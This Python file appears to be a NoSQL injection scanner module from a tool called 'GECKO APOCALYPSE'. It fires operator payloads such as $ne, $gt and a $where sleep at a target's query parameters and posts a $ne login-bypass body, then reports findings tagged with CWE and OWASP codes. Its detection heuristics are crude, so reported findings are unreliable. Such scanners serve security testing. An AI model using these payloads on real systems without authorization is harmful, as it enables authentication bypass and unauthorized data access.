"""GECKO APOCALYPSE - NoSQL Injector"""

import asyncio
import json
from typing import Dict, List
from urllib.parse import parse_qs, urlencode, urlparse

import aiohttp


class NoSQLInjector:
    def __init__(self, session, config, db):
        self.session = session
        self.config = config
        self.db = db

    async def scan(self, url, content, headers, response):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        payloads = [
            {"$gt": ""},
            {"$ne": "1"},
            {"$where": "sleep(5)"},
            "true, $where: '1 == 1'",
            "|| 1==1",
            "' || '1'=='1",
        ]

        # Test Query Params
        for param in params:
            for p in payloads:
                test = self._inject(url, param, p)
                try:
                    async with self.session.get(
                        test, timeout=aiohttp.ClientTimeout(total=10)
                    ) as r:
                        c = await r.text(errors="ignore")
                        if (
                            r.status in [200, 201] and len(c) > len(content) + 500
                        ):  # Simple heuristic
                            findings.append(
                                {
                                    "type": "NoSQL Injection (GET)",
                                    "severity": "HIGH",
                                    "url": url,
                                    "parameter": param,
                                    "payload": str(p),
                                    "evidence": "Response length significantly increased",
                                    "cwe": "CWE-943",
                                    "owasp": "A03:2021",
                                }
                            )
                            break
                except:
                    pass

        # Test JSON body if applicable
        if "application/json" in headers.get("content-type", "").lower():
            try:
                auth_payload = {"username": {"$ne": None}, "password": {"$ne": None}}
                async with self.session.post(
                    url, json=auth_payload, timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status in [200, 201]:
                        findings.append(
                            {
                                "type": "NoSQL Auth Bypass (POST)",
                                "severity": "CRITICAL",
                                "url": url,
                                "payload": json.dumps(auth_payload),
                                "evidence": f"Auth bypassed, status {r.status}",
                                "cwe": "CWE-943",
                                "owasp": "A01:2021",
                            }
                        )
            except:
                pass

        return findings

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if isinstance(value, dict):
            for k, v in value.items():
                params[f"{param}[{k}]"] = [v]
            if param in params and f"{param}[{k}]" in params:
                del params[param]
        else:
            params[param] = [value]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()
